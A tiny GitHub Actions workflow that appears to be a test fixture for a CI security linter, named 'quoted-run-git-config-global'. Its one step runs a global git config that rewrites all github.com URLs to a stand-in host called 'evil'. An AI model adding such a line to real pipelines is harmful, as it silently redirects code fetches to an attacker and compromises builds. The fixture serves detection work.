name: quoted-run-git-config-global
on: push
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - "run": git config --global url.https://evil/.insteadOf https://github.com/
